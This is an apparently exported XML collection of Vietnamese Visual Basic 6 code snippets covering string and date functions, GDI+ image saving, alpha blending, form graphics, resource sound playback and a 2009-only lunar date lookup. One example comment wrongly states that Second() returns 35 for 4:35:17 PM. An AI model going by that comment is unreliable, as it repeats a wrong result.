Dim UpperCase, LowerCase
    LowerCase = "Hello WORLD 1234"   ' Khoi tao
    UpperCase = UCase(LowerCase)   ' Returns "HELLO WORLD 1234".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000093</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate, MyYear
    MyDate = #8/10/2003#  ' Khoi tao
    MyYear = Year(MyDate)   ' Returns 2003
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000085</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDate, MyMonth
    MyDate = #8/10/2003#  ' Khoi tao
    MyMonth = Month(MyDate)   ' Returns 08
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000084</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyTime, MyMinute
    MyTime = #4:35:17 PM# ' Khoi tao
    MyMinute = Minute(MyTime) ' Returns 35
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000088</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyTime, MySecond
    MyTime = #4:35:17 PM# ' Khoi tao
    MySecond = Second(MyTime) ' Returns 35
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000046</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim AnyString, MyStr
    AnyString = "Hello World"   ' Khoi tao
    MyStr = Mid(AnyString, 1, 3)   ' Returns "Hel".
    MyStr = Mid(AnyString, 4, 4)   ' Returns "lo W".
    MyStr = Right(AnyString, 3)   ' Returns "rld".
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000182</MaVD>
    <NoiDung>Thêm đoạn code này vào Form chính:
Private Declare Sub InitCommonControls Lib "comctl32" ()
Private Sub Form_Initialize()
    InitCommonControls
End Sub

Bạn copy đoạn code sau vô chương trình soạn thảo NotePad: 

&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt; 
&lt;assembly 
xmlns="urn:schemas-microsoft-com:asm.v1" 
manifestVersion="1.0"&gt; 
&lt;assemblyIdentity 
processorArchitecture="x86" 
version="1.0.0.0" 
type="win32" 
name="your application name"/&gt; 
&lt;description&gt;...Enter your description here ....&lt;/description&gt; 
&lt;dependency&gt; 
&lt;dependentAssembly&gt; 
&lt;assemblyIdentity 
type="win32" 
name="Microsoft.Windows.Common-Controls" 
version="6.0.0.0" 
publicKeyToken="6595b64144ccf1df" 
language="*" 
processorArchitecture="x86"/&gt; 
&lt;/dependentAssembly&gt; 
&lt;/dependency&gt; 
&lt;/assembly&gt; 

Save lại và khi muốn cho chương trình có giao diện XP thì copy file chứa code trên vô thư mục cùng chung với file.exe, đặt lại tên cho nó: tên_chương_trình_của_bạn.exe.manifest 
Ví dụ: bạn có 1 file chương trình: timcap.exe 
Đổi tên file chứa đoạn code trên thành: timcap.exe.manifest 
Bây giờ thử mở chương trình timcap.exe lên xem, nó đã có giao diện XP …</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090023040001</MaVD>
    <NoiDung>'tao 1 form
'tao 1 timer voi interval = 200
Option Explicit
Const Pi As Double = 3.1415926
Private Sub Form_Load()
    Randomize
    Timer1.Interval = 200
End Sub
Private Sub Timer1_Timer()
    Me.BackColor = RGB(255, 255, 255)
    Me.ForeColor = RGB(Rnd * 255, Rnd * 255, Rnd * 255)
    Me.Cls
    Dim n, x0, y0, r As Integer
    n = 20
    x0 = Me.Width / 2
    y0 = Me.Height / 2
    r = y0 * 0.8
    Dim px(), py() As Double
    ReDim px(n), py(n)
    Dim i, j As Integer
    For i = 1 To n
        px(i) = x0 + r * Cos(i * 2 * Pi / n)
        py(i) = y0 + r * Sin(i * 2 * Pi / n)
    Next
    For i = 1 To n
        For j = 1 To i - 1
            Line (px(i), py(i))-(px(j), py(j))
        Next
    Next
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090323040311</MaVD>
    <NoiDung>Module:

Option Explicit
         
'*********************************************************************
' A short procedure to give forms a nice teal shading.
'
Public Sub Dither(frm As Form)
    Dim intLoop As Integer                       ' Counter
   
    ' Set the pen parameters
    frm.DrawStyle = vbInsideSolid
    frm.DrawMode = vbCopyPen
    frm.ScaleMode = vbPixels
    frm.DrawWidth = 8
    frm.ScaleWidth = 176
    ' Shade the form
    For intLoop = 0 To 175
        frm.Line (intLoop, 0)-(intLoop - 1, Screen.Height), RGB(0, intLoop, intLoop), B
    Next intLoop
End Sub

Form:

Private Sub Form_Load()
Dither Me
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090723040745</MaVD>
    <NoiDung>Lưu hình trong Picture ra file JPG (Tùy chọn chất lượng ảnh)
'Cần 1 PictureBox(Đã load sẵn hình ảnh)
Option Explicit
 
Private Type GUID
   Data1 As Long
   Data2 As Integer
   Data3 As Integer
   Data4(0 To 7) As Byte
End Type
 
Private Type GdiplusStartupInput
   GdiplusVersion As Long
   DebugEventCallback As Long
   SuppressBackgroundThread As Long
   SuppressExternalCodecs As Long
End Type
 
Private Type EncoderParameter
   GUID As GUID
   NumberOfValues As Long
   Type As Long
   Value As Long
End Type
 
Private Type EncoderParameters
   Count As Long
   Parameter As EncoderParameter
End Type
 
Private Declare Function GdiplusStartup Lib "GDIPlus" (token As Long, inputbuf As GdiplusStartupInput, Optional ByVal outputbuf As Long = 0) As Long
Private Declare Function GdiplusShutdown Lib "GDIPlus" (ByVal token As Long) As Long
Private Declare Function GdipCreateBitmapFromHBITMAP Lib "GDIPlus" (ByVal hbm As Long, ByVal hPal As Long, Bitmap As Long) As Long
Private Declare Function GdipDisposeImage Lib "GDIPlus" (ByVal Image As Long) As Long
Private Declare Function GdipSaveImageToFile Lib "GDIPlus" (ByVal Image As Long, ByVal filename As Long, clsidEncoder As GUID, encoderParams As Any) As Long
Private Declare Function CLSIDFromString Lib "ole32" (ByVal str As Long, id As GUID) As Long
 
Public Sub SaveJPG(ByVal pict As StdPicture, ByVal filename As String, Optional ByVal Quality As Byte = 80)
 
Dim tSI As GdiplusStartupInput
Dim lRes As Long
Dim lGDIP As Long
Dim lBitmap As Long
   ' Initialize GDI+
   tSI.GdiplusVersion = 1
   lRes = GdiplusStartup(lGDIP, tSI)
   If lRes = 0 Then
      ' Create the GDI+ bitmap
      ' from the image handle
      lRes = GdipCreateBitmapFromHBITMAP(pict.Handle, 0, lBitmap)
      If lRes = 0 Then
         Dim tJpgEncoder As GUID
         Dim tParams As EncoderParameters
         ' Initialize the encoder GUID
         CLSIDFromString StrPtr("{557CF401-1A04-11D3-9A73-0000F81EF32E}"), tJpgEncoder
         ' Initialize the encoder parameters
         tParams.Count = 1
         With tParams.Parameter ' Quality
            ' Set the Quality GUID
            CLSIDFromString StrPtr("{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"), .GUID
            .NumberOfValues = 1
            .Type = 4
            .Value = VarPtr(Quality)
         End With
 
         ' Save the image
         lRes = GdipSaveImageToFile(lBitmap, StrPtr(filename), tJpgEncoder, tParams)
 
         ' Destroy the bitmap
         GdipDisposeImage lBitmap
      End If
      ' Shutdown GDI+
      GdiplusShutdown lGDIP
   End If
   If lRes Then
      Err.Raise 5, , "Cannot save the image. GDI+ Error:" &amp; lRes
   End If
End Sub
 
Private Sub Picture1_DblClick()
    SaveJPG Picture1, "C:\Jpg.jpg", 100
End Sub

'Một thủ thuật nữa, Lưu thêm các định dạng ảnh GIF, TIF, PNG

'Form code:
'Cần 1 Picture đã load hình sẵn. 1 TextBox ="Test", 1 ComboBox, 1 CommandButton
Option Explicit
 
Private Sub Command1_Click()
    If SavePictureFromHDC(Picture1.Picture, Text1.Text &amp; Combo1.Text) = True Then
        MsgBox Text1.Text &amp; Combo1.Text &amp; " Saved OK!"
    Else
        MsgBox "ERROR! " &amp; Text1.Text &amp; Combo1.Text &amp; " Not Saved!"
    End If
End Sub
 
Private Sub Form_Load()
    
    StartUpGDIPlus GdiPlusVersion
    
    Combo1.AddItem ".GIF"
    Combo1.AddItem ".JPG"
    Combo1.AddItem ".PNG"
    Combo1.AddItem ".TIF"
    Combo1.Text = ".GIF"
End Sub
 
Private Sub Form_Unload(Cancel As Integer)
    ShutdownGDIPlus
End Sub
 
'Module code:
Option Explicit
 
Private GdipToken       As Long
Private GdipInitialized As Boolean
 
Public Const GdiPlusVersion     As Long = 1
Private Const CP_ACP            As Long = 0
 
Private Type GUID
    Data1 As Long
    Data2 As Integer
    Data3 As Integer
    Data4(0 To 7) As Byte
End Type
 
Private Type ImageCodecInfo
   ClassID As GUID
   FormatID As GUID
   CodecName As Long
   DllName As Long
   FormatDescription As Long
   FilenameExtension As Long
   MimeType As Long
   flags As Long
   Version As Long
   SigCount As Long
   SigSize As Long
   SigPattern As Long
   SigMask As Long
End Type
 
Private Type GDIPlusStartupInput
    GdiPlusVersion As Long
    DebugEventCallback As Long
    SuppressBackgroundThread As Long
    SuppressExternalCodecs As Long
End Type
 
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function lstrlenW Lib "kernel32" (ByVal lpString As Long) As Long
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal codepage As Long, ByVal dwFlags As Long, lpWideCharStr As Any, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As String, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function GdiplusStartup Lib "gdiplus" (ByRef token As Long, ByRef lpInput As GDIPlusStartupInput, Optional ByRef lpOutput As Any) As Long
Private Declare Function GdiplusShutdown Lib "gdiplus" (ByVal token As Long) As Long
Private Declare Function GdipSaveImageToFile Lib "gdiplus" (ByVal Image As Long, ByVal FileName As Long, ByRef clsidEncoder As GUID, ByRef encoderParams As Any) As Long
Private Declare Function GdipDisposeImage Lib "gdiplus" (ByVal Image As Long) As Long
Private Declare Function GdipCreateBitmapFromHBITMAP Lib "gdiplus.dll" (ByVal hbm As Long, ByVal hpal As Long, nBitmap As Long) As Long
Private Declare Function GdipGetImageEncodersSize Lib "gdiplus" (ByRef numEncoders As Long, ByRef size As Long) As Long
Private Declare Function GdipGetImageEncoders Lib "gdiplus" (ByVal numEncoders As Long, ByVal size As Long, ByRef Encoders As Any) As Long
 
Public Function SavePictureFromHDC(ByVal hBitmap As Long, ByVal sFileName As String) As Boolean
    Dim lBitmap As Long
    Dim PicEncoder As GUID
    Dim sID As String
    
    ' Use file name extention to determine,
    ' what format we want to save the file in.
    Select Case LCase$(Right$(sFileName, 4))
        Case ".png"
            sID = "image/png"
        Case ".gif"
            sID = "image/gif"
        Case ".jpg"
            sID = "image/jpeg"
        Case ".tif"
            sID = "image/tiff"
        Case ".bmp"
            sID = "image/bmp"
        Case Else
            Exit Function
    End Select
    
    If GdipCreateBitmapFromHBITMAP(hBitmap, 0&amp;, lBitmap) = 0 Then
        If GetEncoderClsid(sID, PicEncoder) = True Then
            SavePictureFromHDC = (GdipSaveImageToFile(lBitmap, StrPtr(sFileName), PicEncoder, ByVal 0) = 0)
        End If
        GdipDisposeImage lBitmap
    End If
End Function
 
Private Function GetEncoderClsid(strMimeType As String, ClassID As GUID) As Boolean
    
    Dim num As Long
    Dim size As Long
    Dim imgCodecInfo() As ImageCodecInfo
    Dim lval As Long
    Dim buffer() As Byte
 
    GdipGetImageEncodersSize num, size
    If size Then
        ReDim imgCodecInfo(num) As ImageCodecInfo
        ReDim buffer(size) As Byte
 
        GdipGetImageEncoders num, size, buffer(0)
        CopyMemory imgCodecInfo(0), buffer(0), (Len(imgCodecInfo(0)) * num)
 
        For lval = 0 To num - 1
            'image/bmp,image/jpeg,image/gif,image/tiff,image/png
            If StrComp(GetStrFromPtrW(imgCodecInfo(lval).MimeType), strMimeType, vbTextCompare) = 0 Then
                ClassID = imgCodecInfo(lval).ClassID
                GetEncoderClsid = True
                Exit For
            End If
        Next
        Erase imgCodecInfo
        Erase buffer
    End If
    
End Function
 
Private Function GetStrFromPtrW(lpszW As Long) As String
    
    Dim sRV As String
 
    sRV = String$(lstrlenW(ByVal lpszW) * 2, vbNullChar)
    WideCharToMultiByte CP_ACP, 0, ByVal lpszW, -1, ByVal sRV, Len(sRV), 0, 0
    GetStrFromPtrW = Left$(sRV, lstrlenW(StrPtr(sRV)))
    
End Function
 
Public Sub StartUpGDIPlus(ByVal GdipVersion As Long)
    
    Dim GdipStartupInput As GDIPlusStartupInput
    
    GdipStartupInput.GdiPlusVersion = GdipVersion
    GdipInitialized = (GdiplusStartup(GdipToken, GdipStartupInput, ByVal 0&amp;) = 0)
 
End Sub
 
Public Sub ShutdownGDIPlus()
    
    If GdipInitialized Then
        GdiplusShutdown GdipToken
    End If
    
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>090923040923</MaVD>
    <NoiDung>'Thủ thuật AlphaBlend
'Cần 2 Timer (Timer1,Timer1) 2 PictureBox (Picture1, Picture2) 2 PictureBox này load 2 hình khác nhau.
 
Const AC_SRC_OVER = &amp;H0
 
Private Type BLENDFUNCTION
 BlendOp As Byte
 BlendFlags As Byte
 SourceConstantAlpha As Byte
 AlphaFormat As Byte
End Type
 
Private Declare Function AlphaBlend Lib "msimg32.dll" (ByVal hdc As Long, ByVal lInt As Long, ByVal lInt As Long, ByVal lInt As Long, ByVal lInt As Long, ByVal hdc As Long, ByVal lInt As Long, ByVal lInt As Long, ByVal lInt As Long, ByVal lInt As Long, ByVal BLENDFUNCT As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32.dll" (Destination As Any, Source As Any, ByVal Length As Long)
 
Dim BlendVal As Integer
Dim BF As BLENDFUNCTION, lBF As Long
 
Dim tempPic1 As New StdPicture, tempPic2 As New StdPicture
 
Private Sub Form_Load()
    With Picture1
        .AutoRedraw = True
        .ScaleMode = vbPixels
    End With
    
    With Picture2
        .AutoRedraw = True
        .ScaleMode = vbPixels
    End With
  
    'set the parameters
    'AlphaBlend the picture from Picture1 over the picture of Picture2
    BlendVal = 1
    Set tempPic1 = Picture1.Picture
    Set tempPic2 = Picture2.Picture
  
    With Timer1
        .Interval = 60
        .Enabled = True
    End With
    
    With Timer2
        .Interval = 60
        .Enabled = False
    End With
End Sub
 
Private Sub Form_Unload(Cancel As Integer)
    Timer1.Enabled = False
    Timer2.Enabled = False
End Sub
 
Public Sub DoAlphablend(SrcPicBox As PictureBox, DestPicBox As PictureBox, AlphaVal As Integer)
    With BF
        .BlendOp = AC_SRC_OVER
        .BlendFlags = 0
        .SourceConstantAlpha = AlphaVal
        .AlphaFormat = 0
    End With
    'copy the BLENDFUNCTION-structure to a Long
    RtlMoveMemory lBF, BF, 4
    'AlphaBlend the picture from Picture1 over the picture of Picture2
    AlphaBlend DestPicBox.hdc, 0, 0, DestPicBox.ScaleWidth, DestPicBox.ScaleHeight, SrcPicBox.hdc, 0, 0, SrcPicBox.ScaleWidth, SrcPicBox.ScaleHeight, lBF
End Sub
 
Private Sub Timer1_Timer()
    Picture1.Refresh
    Picture2.Refresh
 
    BlendVal = BlendVal + 5
    If BlendVal &gt;= 155 Then
        Flag = True
        Timer1.Enabled = False
        Picture2.Picture = tempPic1
        Timer2.Enabled = True
        BlendVal = 1
    End If
  
    DoAlphablend Picture2, Picture1, BlendVal
 
    Me.Caption = CStr(BlendVal)
End Sub
 
Private Sub Timer2_Timer()
    Picture1.Refresh
    Picture2.Refresh
 
    BlendVal = BlendVal + 5
    If BlendVal &gt;= 155 Then
        BlendVal = 1
        Timer1.Enabled = True
        Timer2.Enabled = False
        Picture2.Picture = tempPic2
    End If
    DoAlphablend Picture2, Picture1, BlendVal
 
    Me.Caption = CStr(BlendVal)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091223041243</MaVD>
    <NoiDung>thêm một Comand và một timer vào thôi, dán Code vào và F5

Private W As Integer
Private H As Integer
Private Type Stars
 x As Double
 y As Integer
 AddX As Integer
 AddY As Integer
End Type
Private Star(1000) As Stars
Private Accelarate As Boolean
Private Declare Function SetPixel Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal crColor As Long) As Long
Private Sub Command1_Click()
Timer1.Interval = 1
MoveTo = move_forward
Command1.Visible = False
Accelarate = False
WindowState = 2
W = ScaleWidth
H = ScaleHeight
 For i = 1 To 150
  Star(i).x = W / 2
  Star(i).y = H / 2
RandomX:
  Randomize
  Star(i).AddX = Int(Rnd * 29) - Int(Rnd * 29)
  If Star(i).AddX = 0 Then GoTo RandomX
RandomY:
  Star(i).AddY = Int(Rnd * 19) - Int(Rnd * 19)
  If Star(i).AddY = 0 Then GoTo RandomY
 Next
End Sub
Private Sub Form_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = vbKeyEscape Then End
End Sub
Private Sub Form_Load()
Me.BorderStyle = 0
Me.DrawWidth = 5
Me.ScaleMode = 3
Me.BackColor = &amp;H80000007
Me.WindowState = 2
End Sub
Private Sub Timer1_Timer()
If Command1.Visible = True Then Exit Sub
For i = 1 To 150
 SetPixel hdc, W / 2, H / 2, &amp;H404040
 Select Case Abs(W / 2 - (Star(i).x))
  Case Is &lt; 20
   col = &amp;H0&amp;
   Size = 1
  Case Is &lt; 80
   col = &amp;H404040
   Size = 1
  Case Is &lt; 150
   col = &amp;H808080
   Size = 2
  Case Is &lt; 200
   col = &amp;HC0C0C0
   Size = 3
  Case Is &lt; 250
   col = &amp;HFFFFFF
   Size = 4
  Case Else
   col = &amp;HFFFFFF
   Size = 5
 End Select
 Select Case Abs(H / 2 - (Star(i).y))
  Case Is &lt; 20
   If Size = 0 Then
    Size = 1
    col = back5
   End If
  Case Is &lt; 80
   If Size = 0 Then
    col = &amp;H404040
    Size = 1
   End If
  Case Is &lt; 150
   If Size &lt; 2 Then
    Size = 2
    col = &amp;H808080
   End If
  Case Is &lt; 200
   If Size &lt; 3 Then
    Size = 3
    col = &amp;HC0C0C0
   End If
  Case Is &lt; 250
   If Size &lt; 4 Then
    Size = 4
    col = &amp;HFFFFFF
   End If
  Case Else
   If Size &lt; 5 Then
    Size = 5
    col = &amp;HFFFFFF
   End If
 End Select
SetPixel hdc, W / 2, H / 2, col
Select Case Size
 Case 1
  SetPixel Me.hdc, Star(i).x, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y + Star(i).AddY, col
 Case 2
  SetPixel Me.hdc, Star(i).x, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y + Star(i).AddY, col
 Case 3
  SetPixel Me.hdc, Star(i).x, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1, Star(i).y - 1, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y - 1 + Star(i).AddY, col
 Case 4
  SetPixel Me.hdc, Star(i).x, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1, Star(i).y - 1, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x, Star(i).y - 1, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y - 1 + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y - 1 + Star(i).AddY, col
 Case 5
  SetPixel Me.hdc, Star(i).x + a, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1 + a, Star(i).y, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1 + a, Star(i).y - 1, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x + a, Star(i).y - 1, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x + a, Star(i).y - 2, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x - 1 + a, Star(i).y - 2, &amp;H0&amp;
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y - 1 + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y - 1 + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x + Star(i).AddX, Star(i).y - 2 + Star(i).AddY, col
  SetPixel Me.hdc, Star(i).x - 1 + Star(i).AddX, Star(i).y - 2 + Star(i).AddY, col
End Select
Star(i).x = Star(i).x + Star(i).AddX
Star(i).y = Star(i).y + Star(i).AddY
Star(i).AddX = Star(i).AddX + Sgn(Star(i).AddX) * (Size / 5)
Star(i).AddY = Star(i).AddY + Sgn(Star(i).AddY) * (Size / 5)
If Accelarate Then
 Star(i).AddX = Star(i).AddX + Sgn(Star(i).AddX) * Size
 Star(i).AddY = Star(i).AddY + Sgn(Star(i).AddY) * Size
End If
If Star(i).x &lt; 0 Or Star(i).x &gt; ScaleWidth Or Star(i).y &lt; 0 Or Star(i).y &gt; ScaleHeight Then
  Star(i).x = W / 2
  Star(i).y = H / 2
RandomX:
  Randomize
  Star(i).AddX = Int(Rnd * 29) - Int(Rnd * 29)
  If Star(i).AddX = 0 Then GoTo RandomX
RandomY:
  Star(i).AddY = Int(Rnd * 19) - Int(Rnd * 19)
  If Star(i).AddY = 0 Then GoTo RandomY
End If
Next
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>091523041514</MaVD>
    <NoiDung>Add một file wav vào resource, cho command1 vào form và chạy đoạn code này

Option Explicit
 
'API Declarations
Private Declare Function sndPlaySound Lib "winmm.dll" Alias
"sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As
Long
 
'Module Level Constant Declarations
Private Const SND_ASYNC As Long = &amp;H1
Private Const SND_MEMORY As Long = &amp;H4
Private Const SND_NODEFAULT = &amp;H2
Private Const Flags&amp; = SND_ASYNC Or SND_NODEFAULT Or SND_MEMORY
 
'Control-related Events
Private Sub Command1_Click()
Dim b As String
 
b = StrConv(LoadResData(101, "WAVE"), vbUnicode)
 
sndPlaySound b, Flags&amp;
End Sub

Còn nếu muốn chơi các file nhạc khác không phải định dạng wav thì chỉ có cách xuất ra file vào thư mục tạm để chạy thôi

Dim File() As Byte
File = LoadResData(101, "CUSTOM")
Open &lt;Path&gt; For Binary As #1
  Put #1, , File
Close #1</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092023042009</MaVD>
    <NoiDung>Private Type SôNgày
TongSo As Integer
SoX As Integer
NgayX As Date
End Type
Private Sub Form_Load()
Dim b As SôNgày
   b = SoNgayX(8, #9/22/2008#, #10/22/2008#) '1,8... là CN.  2,9 v v..
   MsgBox "Tông sô ngày: " &amp; b.TongSo &amp; vbCr &amp; "Sô ngày thu' X: " &amp; b.SoX &amp; vbCr &amp; "Thu' X gân nhât là: " &amp; b.NgayX
End Sub
Private Function SoNgayX(X As Byte, d1 As Date, d2 As Date) As SôNgày
' X = 1 Chu nhât. X = 2 Thu' Hai. X = 3 Thu' Ba ...
 SoNgayX.TongSo = d2 - d1 + 1
 SoNgayX.SoX = CInt((d2 - d1 - Weekday(d2 - X + 1) + 8) \ 7)
 If (d2 - Weekday(d2) + X) &gt; d2 Then SoNgayX.NgayX = d2 - Weekday(d2) + X - 7 Else SoNgayX.NgayX = d2 - Weekday(d2) + X
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092223042245</MaVD>
    <NoiDung> Cần Text1: nhập ngày Text2: nhập tháng Text3: Xuất Ngày Âm Lich và Command1

Dim NgayDL As Date: NgayDL = Text2 &amp; "/" &amp; Text1 &amp; "/2009"
Dim HieuSo As Integer: HieuSo = NgayDL - #1/1/2009#
If HieuSo &lt; 25 Then Text3 = HieuSo + 6 &amp; "/12/Mâu Tý"
If HieuSo &lt; 55 And HieuSo &gt; 24 Then Text3 = HieuSo + 6 - 30 &amp; "/1/Ky Su'u"
If HieuSo &lt; 84 And HieuSo &gt; 54 Then Text3 = HieuSo + 6 - 60 &amp; "/2/Ky Su'u"
If HieuSo &lt; 114 And HieuSo &gt; 83 Then Text3 = HieuSo + 6 - 89 &amp; "/3/Ky Su'u"
If HieuSo &lt; 143 And HieuSo &gt; 113 Then Text3 = HieuSo + 6 - 119 &amp; "/4/Ky Su'u"
If HieuSo &lt; 173 And HieuSo &gt; 142 Then Text3 = HieuSo + 6 - 148 &amp; "/5/Ky Su'u"
If HieuSo &lt; 202 And HieuSo &gt; 172 Then Text3 = HieuSo + 6 - 178 &amp; "/5N/Ky Su'u"
If HieuSo &lt; 231 And HieuSo &gt; 201 Then Text3 = HieuSo + 6 - 207 &amp; "/6/Ky Su'u"
If HieuSo &lt; 261 And HieuSo &gt; 230 Then Text3 = HieuSo + 6 - 236 &amp; "/7/Ky Su'u"
If HieuSo &lt; 290 And HieuSo &gt; 260 Then Text3 = HieuSo + 6 - 266 &amp; "/8/Ky Su'u"
If HieuSo &lt; 320 And HieuSo &gt; 289 Then Text3 = HieuSo + 6 - 295 &amp; "/9/Ky Su'u"
If HieuSo &lt; 349 And HieuSo &gt; 319 Then Text3 = HieuSo + 6 - 325 &amp; "/10/Ky Su'u"
If HieuSo &lt; 365 And HieuSo &gt; 348 Then Text3 = HieuSo + 6 - 354 &amp; "/11/Ky Su'u"</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092723042705</MaVD>
    <NoiDung>1- Tìm các ký tự thiếu:

Copy bài: Nội quy và cấu trúc phân quyền trong diễn đàn. bởi Admin
http://caulacbovb.com/forum/viewtopic.php?f=27&amp;t=1#p1
dán vào notepad và lưu với tên: "C:\Test.txt", nhớ định dạng là unicode

Chạy đoạn code sau

1a- Chép vào Module

' Kiêu gõ UTF8- Literal
' Module MessageBox hô tro' tiêng Viêt toàn bô
Public Declare Function MessageBox Lib "user32.dll" Alias "MessageBoxW" (ByVal hwnd As Long, ByVal lpText As Long, ByVal lpCaption As Long, ByVal wType As Long) As Long
Public Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByRef lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
Public Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, ByRef lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As String, ByVal lpUsedDefaultChar As Long) As Long
Public Const CP_UTF8 = 65001
Public Function UTF82Unicode(ByVal sUTF8 As String) As String
Dim UTF8Size&amp;, BufferSize&amp;, BufferUNI$, LenUNI&amp;, bUTF8() As Byte
If LenB(sUTF8) = 0 Then Exit Function
bUTF8 = StrConv(sUTF8, vbFromUnicode)
UTF8Size = UBound(bUTF8) + 1
BufferSize = UTF8Size * 2
BufferUNI = String$(BufferSize, vbNullChar)
LenUNI = MultiByteToWideChar(CP_UTF8, 0, bUTF8(0), UTF8Size, StrPtr(BufferUNI), BufferSize)
If LenUNI Then UTF82Unicode = Left$(BufferUNI, LenUNI)
End Function
Public Function Msg(ByVal Text As String, Optional ByVal Title As String = "ThÃ´ng BÃ¡o", Optional ByVal FormhWnd As Long = 0) As VbMsgBoxResult
Dim Text1$
Text1 = Unicode2UTF8(Text)
Msg = MessageBox(FormhWnd, StrPtr(UTF82Unicode(Text1)), StrPtr(UTF82Unicode(Title)), 0)
End Function
 
Public Function Unicode2UTF8(ByVal strUnicode As String) As String
Dim LenUNI&amp;, BufferSize&amp;, LenUTF8&amp;, bUTF8() As Byte
 
LenUNI = Len(strUnicode)
If LenUNI = 0 Then Exit Function
 
BufferSize = LenUNI * 3 + 1
ReDim bUTF8(BufferSize - 1)
 
LenUTF8 = WideCharToMultiByte(CP_UTF8, 0, StrPtr(strUnicode), LenUNI, bUTF8(0), BufferSize, vbNullString, 0)
 
If LenUTF8 Then
ReDim Preserve bUTF8(LenUTF8 - 1)
Unicode2UTF8 = StrConv(bUTF8, vbUnicode)
End If
End Function


1b- Chép vào Form

Private Sub Form_Load()
Const ForReading = 1
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\Test.txt", 1, , -2)     'Ðoc unicode
 
Set objRegEx = CreateObject("VBScript.RegExp")
objRegEx.Global = True
objRegEx.Pattern = "\b1....\b"      'Mâu loc ký tu'
 
Do Until objFile.AtendOfStream
    strSearchString = objFile.ReadLine
    Set colMatches = objRegEx.Execute(strSearchString)
 
    If colMatches.Count &gt; 0 Then
        For Each strMatch In colMatches
           a = a &amp; strMatch.Value &amp; vbCr
        Next
    End If
Loop
Msg a
objFile.Close
 
End Sub

2- Nội dung:
Với mẫu tìm: "\b..a.n...\b", nghĩa là tìm chuỗi có 8 ký tự kể cả ký tự space, có 3 đáp án.
